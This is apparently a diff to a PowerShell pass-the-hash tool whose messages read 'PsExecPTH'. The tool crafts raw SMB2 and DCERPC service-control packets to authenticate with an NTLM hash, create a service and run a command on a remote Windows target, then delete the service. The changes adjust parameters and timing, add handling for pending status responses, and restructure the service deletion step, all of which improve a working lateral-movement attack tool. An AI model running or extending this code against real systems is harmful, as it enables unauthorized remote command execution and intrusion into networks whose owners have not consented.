@@ -48,9 +48,9 @@ param
     [parameter(Mandatory=$true)][String]$Command,
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
     [parameter(Mandatory=$false)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
-    [parameter(Mandatory=$false)][String]$Password,
     [parameter(Mandatory=$false)][String]$Service,
-    [parameter(Mandatory=$false)][Switch]$SMB1
+    [parameter(Mandatory=$false)][Switch]$SMB1,
+    [parameter(Mandatory=$false)][String]$Password
 )
 
 if($SMB1)
@@ -347,7 +347,7 @@ function Get-PacketSMB2NegotiateProtocolRequest()
     $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_NegotiateContextCount",[Byte[]](0x00,0x00))
     $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_Reserved2",[Byte[]](0x00,0x00))
     $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_Dialect",[Byte[]](0x02,0x02))
-    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_Dialects2",[Byte[]](0x10,0x02))
+    $packet_SMB2_negotiate_protocol_request.Add("SMB2NegotiateProtocolRequest_Dialect2",[Byte[]](0x10,0x02))
 
     return $packet_SMB2_negotiate_protocol_request
 }
@@ -1237,7 +1237,7 @@ if($SMB_client.Connected)
                
                     'ReadAndXRequest'
                     {
-                        Start-Sleep -m 500
+                        Start-Sleep -m 150
                         $packet_SMB_header = Get-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $process_ID_bytes $SMB_user_ID
 
                         if($SMB_signing)
@@ -1765,7 +1765,8 @@ if($SMB_client.Connected)
                
                     'ReadRequest'
                     {
-                        Start-Sleep -m 500   
+
+                        Start-Sleep -m 150
                         $SMB2_message_ID += 1
                         $packet_SMB2_header = Get-PacketSMB2Header 0x08,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                         $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
@@ -1795,7 +1796,27 @@ if($SMB_client.Connected)
                         $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                         $SMB_client_stream.Flush()
                         $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
-                        $SMB_client_stage = $SMB_client_stage_next
+
+                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
+                        {
+                            $SMB_client_stage = $SMB_client_stage_next
+                        }
+                        else
+                        {
+                            $SMB_client_stage = 'StatusPending'
+                        }
+
+                    }
+
+                    'StatusPending'
+                    {
+                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+
+                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
+                        {
+                            $SMB_client_stage = $SMB_client_stage_next
+                        }
+
                     }
                 
                     'OpenSCManagerW'
@@ -1951,68 +1972,58 @@ if($SMB_client.Connected)
                     'DeleteServiceW'
                     { 
 
-                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
+                        if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '1d-04-00-00')
                         {
+                            Write-Output "PsExecPTH command executed on $Target"
+                        }
+                        elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '02-00-00-00')
+                        {
+                            Write-Output "PsExecPTH service $SMB_service failed to start on $Target"
+                        }
 
-                            if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '1d-04-00-00')
-                            {
-                                Write-Output "PsExecPTH command executed on $Target"
-                            }
-                            elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '02-00-00-00')
-                            {
-                                Write-Output "PsExecPTH service $SMB_service failed to start on $Target"
-                            }
-
-                            $SMB2_message_ID += 20
-                            $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
-                            $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
+                        $SMB2_message_ID += 20
+                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
+                        $packet_SMB2_header["SMB2Header_CreditRequest"] = 0x7f,0x00
                         
-                            if($SMB_signing)
-                            {
-                                $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00
-                            }
-
-                            $packet_SCM_data = Get-PacketSCMDeleteServiceW $SMB_service_context_handle
-                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
-                            $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $SCM_data.length
-                            $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length
-                            $packet_DCERPC_data["DCERPCRequest_Opnum"] = 0x02,0x00
-                            $packet_DCERPC_data["DCERPCRequest_CallID"] = 0x04,0x00,0x00,0x00
-                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
-                            $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
-                            $DCERPC_data_length = $SMB2_data.Length + $SCM_data.Length + $DCERPC_data.Length
-                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $DCERPC_data_length
-                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
-
-                            if($SMB_signing)
-                            {
-                                $SMB2_sign = $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
-                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
-                                $SMB2_signature = $SMB2_signature[0..15]
-                                $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
-                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            }
-
-                            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
-                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
-                            $SMB_client_stream.Flush()
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
-                            $SMB_client_stage = 'ReadRequest'
-                            $SMB_client_stage_next = 'CloseServiceHandle'
-                            $SMB_close_service_handle_stage = 1
-
-                        }
-                        else # handle status pending
+                        if($SMB_signing)
                         {
-                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
-                            $SMB_client_stage = 'DeleteServiceW'
+                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00
                         }
 
+                        $packet_SCM_data = Get-PacketSCMDeleteServiceW $SMB_service_context_handle
+                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
+                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $SCM_data.length
+                        $packet_DCERPC_data = Get-PacketDCERPCRequest $SCM_data.length
+                        $packet_DCERPC_data["DCERPCRequest_Opnum"] = 0x02,0x00
+                        $packet_DCERPC_data["DCERPCRequest_CallID"] = 0x04,0x00,0x00,0x00
+                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
+                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
+                        $DCERPC_data = ConvertFrom-PacketOrderedDictionary $packet_DCERPC_data 
+                        $DCERPC_data_length = $SMB2_data.Length + $SCM_data.Length + $DCERPC_data.Length
+                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $DCERPC_data_length
+                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
+
+                        if($SMB_signing)
+                        {
+                            $SMB2_sign = $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
+                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
+                            $SMB2_signature = $SMB2_signature[0..15]
+                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
+                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
+                        }
+
+                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $DCERPC_data + $SCM_data
+                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
+                        $SMB_client_stream.Flush()
+                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
+                        $SMB_client_stage = 'ReadRequest'
+                        $SMB_client_stage_next = 'CloseServiceHandle'
+                        $SMB_close_service_handle_stage = 1
                     }
 
                     'CloseServiceHandle'
                     {
+
                         if($SMB_close_service_handle_stage -eq 1)
                         {
                             Write-Output "PsExecPTH service $SMB_service deleted on $Target"
@@ -2178,7 +2189,9 @@ if($SMB_client.Connected)
     $SMB_client.Close()
 }
 
-}Function Get-MD4Hash {
+}
+
+Function Get-MD4Hash {
 <#
 .SYNOPSIS
     This cmdlet returns the MD4 hash of the data that is input.
